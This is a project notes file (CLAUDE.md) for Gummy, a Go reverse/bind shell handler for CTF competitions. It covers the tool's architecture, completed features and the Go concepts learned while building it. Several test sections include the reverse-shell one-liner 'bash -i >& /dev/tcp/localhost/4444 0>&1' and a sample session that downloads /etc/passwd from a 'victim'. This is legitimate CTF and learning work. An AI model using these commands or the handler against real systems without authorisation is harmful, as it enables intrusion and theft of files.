# Gummy - Advanced Shell Handler for CTFs

## Project Overview

Gummy is a modern shell handler written in Go, designed for CTF competitions. It's a port/reimplementation of [Penelope](https://github.com/brightio/penelope) with enhanced features and a beautiful TUI interface using Bubble Tea.

**Primary Goals:**
- Learn Go by building a practical tool
- Create a robust reverse/bind shell handler for CTFs
- Implement advanced features (PTY upgrade, file transfers, port forwarding)
- Build a polished TUI with Bubble Tea

## Current Status

### ✅ Completed (Phase 1 & 2 - Core + Advanced Features)
- [x] Project structure setup
- [x] TCP listener implementation (`internal/listener/listener.go`)
- [x] Session Manager with goroutines and channels (`internal/session/manager.go`)
- [x] Shell Handler with bidirectional I/O (`internal/shell/handler.go`)
- [x] **PTY upgrade system** - Automatic upgrade to proper TTY (`internal/pty/upgrade.go`)
  - Python-based upgrade (`pty.spawn()`)
  - Script command fallback
  - Multiple shell detection (bash, sh, python)
  - Terminal size configuration
  - Silent operation (no spam)
- [x] **File Transfer System** (`internal/transfer/transfer.go`) 🆕
  - Upload files (local → remote) with base64 encoding
  - Download files (remote → local) with base64 decoding
  - Chunked transfer (4KB chunks) for large files
  - Progress bar with visual feedback
  - MD5 checksum verification
  - Automatic cleanup of temporary files
  - Works correctly after shell interaction (connection buffer draining)
- [x] **Readline Integration** (`github.com/chzyer/readline`) 🆕
  - Arrow keys for cursor movement in menu
  - Up/Down for command history navigation
  - Persistent history in `~/.gummy/history` (1000 commands)
  - Standard keybinds (Ctrl+A/E, Ctrl+W, etc.)
- [x] Concurrent connection handling (multiple simultaneous sessions)
- [x] Graceful shutdown with signal handling (clean exit on Ctrl+C)
- [x] Unique session ID generation (crypto/rand)
- [x] Interactive menu system (list, use, shell, upload, download, kill, help, exit)
- [x] Color-coded UI output (`internal/ui/colors.go`)
- [x] Session switching between multiple connections
- [x] Clean connection cleanup on disconnect

### 📋 TODO (Phase 3 - Additional Features)
- [ ] **SIGWINCH handler** - Dynamic terminal resize (currently fixed at connection time)
- [ ] Port forwarding (local/remote)
- [ ] Auto-reconnect capability
- [ ] Tab completion in menu
- [ ] Session logging to files

### 🎨 TODO (Phase 3 - TUI)
- [ ] Bubble Tea interface setup
- [ ] Session list view
- [ ] Interactive shell view
- [ ] File transfer progress indicators
- [ ] Logs panel
- [ ] Status bar with connection info
- [ ] Keyboard shortcuts

## Project Structure

```
gummy/
├── cmd/
│   └── gummy/
│       └── main.go              # ✅ Entry point, CLI flags, signal handling
├── internal/
│   ├── listener/
│   │   └── listener.go          # ✅ TCP listener, connection acceptance
│   ├── session/
│   │   └── manager.go           # ✅ Multi-session manager, interactive menu
│   ├── shell/
│   │   └── handler.go           # ✅ Shell I/O, bidirectional communication
│   ├── ui/
│   │   └── colors.go            # ✅ Color/formatting utilities
│   ├── pty/
│   │   └── upgrade.go           # 🚧 PTY upgrade (in progress)
│   └── transfer/
│       └── transfer.go          # 📋 File transfer (TODO)
├── go.mod
├── go.sum
├── CLAUDE.md                    # This file
└── README.md
```

## Key Design Decisions

### Concurrency Model
- **Goroutines**: Each connection handled in separate goroutine
- **Channels**:
  - Shell Handler uses channels for stdin/stdout/stderr streaming
  - Clean shutdown propagated via context cancellation
- **Mutex**: `sync.RWMutex` protects shared session map in Manager
  - `Lock()` for writes (add/remove sessions)
  - `RLock()` for reads (list sessions, get active session)

### Session Management Architecture
- **Manager**: Centralized session registry (`map[int]*SessionInfo`)
- **Handler**: Per-session I/O handler with goroutines for bidirectional streaming
- **Session IDs**: Integer counter (1, 2, 3, ...) for user-friendly reference
- **Connection IDs**: Crypto/rand hex (16 chars) for internal unique identification
- **Active Session**: Single active session at a time, switchable via `use <id>`
- **Lifecycle**: Automatic cleanup on disconnect detected by Handler

### Error Handling
- Go idiomatic: return errors explicitly
- Error wrapping with `fmt.Errorf("context: %w", err)`
- Graceful degradation where possible
- Log errors but keep server running

## Important Go Concepts Used

### 1. Goroutines
```go
go l.acceptConnections()  // Non-blocking concurrent execution
```

### 2. Channels
```go
l.newSession <- session    // Send
session := <-l.newSession  // Receive
```

### 3. Select Statement
```go
select {
case session := <-l.newSession:
    // Handle new
case id := <-l.closeSession:
    // Handle close
}
```

### 4. Defer
```go
defer conn.Close()  // Always executes on function return
```

### 5. Interfaces (upcoming)
Will be used for:
- `io.Reader` / `io.Writer` for shell I/O
- Custom interfaces for session operations

## Development Environment

**System:** Arch Linux with Hyprland + Fish shell

**Dependencies:**
- Go 1.21+ (check with `go version`)
- No external dependencies yet
- Future: Bubble Tea for TUI

**Build & Run:**
```fish
# Development
go run ./cmd/gummy -p 4444

# Build binary
go build -o gummy ./cmd/gummy

# Run binary
./gummy -p 4444 -h 0.0.0.0
```

**Testing Connection:**
```fish
# In another terminal
nc localhost 4444

# Or real reverse shell
bash -i >& /dev/tcp/localhost/4444 0>&1
```

**Using File Transfer:**
```fish
# Start gummy
./gummy -p 4444

# In another terminal, connect reverse shell
bash -i >& /dev/tcp/localhost/4444 0>&1

# In gummy:
󰗣 gummy ❯ list
Active sessions:
  1 → 127.0.0.1:xxxxx

󰗣 gummy ❯ use 1
 Selected session 1

# Upload file to victim
󰗣 gummy ❯ upload /tmp/test.txt /tmp/uploaded.txt
 Uploading test.txt (42 B)...
 [████████████████████████████████████████] 100% (1/1 chunks)
✅ Upload complete! (MD5: 5d41402a)

# Download file from victim
󰗣 gummy ❯ download /etc/passwd
 Downloading passwd...
 Downloaded 2.1 KB
✅ Download complete! Saved to: passwd (MD5: 8b1a9953)
```

## Next Steps (Priority Order)

### 1. SIGWINCH Handler (MEDIUM PRIORITY)
**File:** `internal/pty/upgrade.go` (enhance existing)

**Current State:**
PTY upgrade is fully implemented and runs automatically! Terminal size is set **once** at connection time.

**Enhancement Needed:**
Handle dynamic terminal resize events. When you resize your terminal window, the remote shell should adapt.

**Implementation:**
```go
func (p *PTYUpgrader) SetupResizeHandler() {
    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, syscall.SIGWINCH)

    go func() {
        for range sigChan {
            width, height := p.getTerminalSize()
            cmd := fmt.Sprintf("stty rows %d cols %d\n", height, width)
            p.conn.Write([]byte(cmd))
        }
    }()
}
```

**Priority:** Medium (nice-to-have, current fixed size works fine for most use cases)

### 2. File Transfer (MEDIUM PRIORITY)
**File:** `internal/transfer/transfer.go`

**Tasks:**
- Base64 encoding/decoding
- Upload files to target
- Download files from target
- Progress indication

### 3. TUI with Bubble Tea (OPTIONAL - Future Enhancement)
**Current State:** We have a functional CLI menu system that works well

**If implementing TUI:**
- Full-screen Bubble Tea interface
- Split panes (session list + active shell)
- Visual session indicators
- Mouse support

**Note:** The current menu system is sufficient for CTF use. TUI would be a polish feature, not a necessity.

## Code Style Guidelines

### Language
- **Code comments, variables, functions:** English only
- **Git commits:** English
- **Documentation:** English

### Go Conventions
- Exported (public): `UpperCamelCase`
- Unexported (private): `lowerCamelCase`
- Constructors: `New()` or `NewTypeName()`
- Error handling: always check, explicit returns
- Use `gofmt` for formatting (automatic in most editors)

### Project Conventions
- Small, focused functions
- Clear separation of concerns
- Comment exported functions and types
- Use meaningful variable names (not too short, not too long)

## Common Patterns to Follow

### Adding New Session Operations
```go
// 1. Add method to Listener
func (l *Listener) OperationName(sessionID string) error {
    l.mu.RLock()
    session, exists := l.sessions[sessionID]
    l.mu.RUnlock()
    
    if !exists {
        return fmt.Errorf("session not found: %s", sessionID)
    }
    
    // Do operation
    return nil
}
```

### Creating New Goroutines
```go
// Always think about:
// 1. How will it terminate?
// 2. How do I signal it to stop?
// 3. Does it need channels for communication?
// 4. Does it access shared state? (needs mutex)

go func() {
    defer log.Println("Goroutine exiting")
    
    for {
        select {
        case <-stopChan:
            return
        case data := <-dataChan:
            // Process
        }
    }
}()
```

### Error Handling
```go
// Wrap errors with context
if err != nil {
    return fmt.Errorf("failed to do X: %w", err)
}

// Log and continue for non-critical errors
if err != nil {
    log.Printf("Warning: %v", err)
    // continue...
}
```

## Testing Strategy

### Manual Testing
```fish
# Start gummy
go run ./cmd/gummy -p 4444

# Connect with netcat
nc localhost 4444

# Later: test with actual reverse shell
bash -i >& /dev/tcp/localhost/4444 0>&1
```

### Future: Unit Tests
- Test session management logic
- Test command parsing
- Mock network connections

## Resources & References

### Penelope (Original Python version)
- https://github.com/brightio/penelope

### Go Documentation
- Tour of Go: https://go.dev/tour/
- Effective Go: https://go.dev/doc/effective_go
- Standard library: https://pkg.go.dev/std

### Bubble Tea (TUI)
- https://github.com/charmbracelet/bubbletea
- Examples: https://github.com/charmbracelet/bubbletea/tree/master/examples

### PTY Handling
- https://github.com/creack/pty
- https://blog.kowalczyk.info/article/zy/creating-pseudo-terminal-pty-in-go.html

## Questions to Consider

- **Session persistence:** Should sessions survive server restart?
- **Logging:** File-based logs vs in-memory vs both?
- **Configuration:** YAML/TOML file vs CLI flags only?
- **Authentication:** Add password/token for connections?
- **Encryption:** TLS support for connections?

## Notes for Claude Code

- This is a learning project - explain concepts when implementing
- Prefer clarity over cleverness
- Each feature should be small, testable, and working
- Comment non-obvious code
- Keep the educational value high

## What We've Learned So Far

### Go Concepts Mastered
1. **Goroutines & Concurrency**
   - Spawning goroutines for concurrent connection handling
   - Understanding when goroutines exit and how to clean them up
   - Race condition prevention with proper synchronization

2. **Channels**
   - Buffered channels for I/O streaming (`make(chan []byte, 100)`)
   - Using channels for inter-goroutine communication
   - Proper channel cleanup to prevent goroutine leaks

3. **Mutex & Thread Safety**
   - `sync.RWMutex` for protecting shared session map
   - Difference between `Lock()`/`Unlock()` and `RLock()`/`RUnlock()`
   - Critical sections and minimizing lock time

4. **Defer & Resource Cleanup**
   - `defer conn.Close()` for guaranteed cleanup
   - Defer execution order (LIFO)
   - Multiple defers in a function

5. **Error Handling**
   - Explicit error returns (no exceptions!)
   - Error wrapping with `fmt.Errorf(...: %w, err)`
   - When to log vs return errors

6. **I/O & Networking**
   - `net.Listener` and `net.Conn` interfaces
   - `io.Copy()` for efficient streaming
   - Handling connection closure and EOF
   - `SetReadDeadline()` for timeout control

7. **Context & Signals**
   - Signal handling with `signal.Notify()`
   - Graceful shutdown patterns
   - Preventing error spam during shutdown

8. **File Operations** 🆕
   - `os.ReadFile()` / `os.WriteFile()` for simple file I/O
   - `os.Stat()` for checking file existence
   - `filepath.Base()` for path manipulation
   - File permissions (0644)

9. **Encoding/Decoding** 🆕
   - `encoding/base64` for safe binary transfer
   - `crypto/md5` for checksums
   - `encoding/hex` for hash representation
   - String chunking for large data

10. **String Manipulation** 🆕
    - `strings.Split()`, `strings.Join()`, `strings.TrimSpace()`
    - `strings.Builder` for efficient string concatenation
    - `strings.Contains()`, `strings.Index()` for searching
    - `strings.LastIndex()` for finding last occurrence (critical for marker detection)
    - Format strings with `fmt.Sprintf()`

11. **External Libraries** 🆕
    - `github.com/chzyer/readline` for rich terminal input
    - History persistence and management
    - Keybindings and cursor control
    - Graceful fallback when unavailable

### Architecture Patterns Used
- **Separation of Concerns**: Listener → Manager → Handler (each has single responsibility)
- **Interface Segregation**: `net.Conn` interface allows flexible I/O handling
- **Fan-out**: One listener spawns multiple handler goroutines
- **Centralized State**: Manager holds all sessions, preventing race conditions
- **Connection Buffer Management**: Critical draining before file transfers to handle post-shell state

## Progress Tracking

**Last updated:** 2025-10-14
**Current focus:** Readline integration complete!
**Next milestone:** Port forwarding or additional polish features
**Lines of code:** ~1,700 LOC across 6 modules + readline dependency
**Status:** Core + File Transfer + Readline COMPLETE! ✅ Production-ready for CTF use!
